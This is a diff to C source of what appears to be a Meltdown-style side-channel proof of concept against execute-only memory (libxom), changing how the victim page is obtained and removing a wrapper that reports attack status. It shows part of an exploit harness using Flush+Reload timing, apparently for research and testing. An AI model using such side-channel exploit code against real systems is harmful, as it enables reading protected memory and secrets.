@@ -7,7 +7,6 @@
 
 #include "libxom.h"
 #include "libcache/cacheutils.h"
-#include "microarchitecture.h"
 
 char *victim_page;
 
@@ -26,7 +25,7 @@ static uint8_t meltdown_xom_internal(uint32_t success_fraction, uint32_t num_sam
     CACHE_MISS = detect_flush_reload_threshold();
   printf("[\x1b[33m*\x1b[0m] Flush+Reload Threshold: \x1b[33m%zd\x1b[0m\n", CACHE_MISS);
 
-  victim_page = xbuf->address;
+  victim_page = *(void**)xbuf;
 
   // Write data we want to recover to our victim page
   memset( victim_page, SECRET, pagesize * sizeof(char) );
@@ -80,14 +79,6 @@ static uint8_t meltdown_xom_internal(uint32_t success_fraction, uint32_t num_sam
   printf("Meltdown-XOM done!\n");
   xom_free(xbuf);
   return success_counter >= num_samples / success_fraction;
-}
-
-attack_status meltdown_xom_c(uint32_t success_fraction, uint32_t num_samples) {
-  const uint8_t any = meltdown_xom_internal(success_fraction, num_samples);
-
-  if(!~any)
-    return (attack_status){{0, 0, 1}};
-  return (attack_status){{any, any, 0}};
 }
 
 int main(){
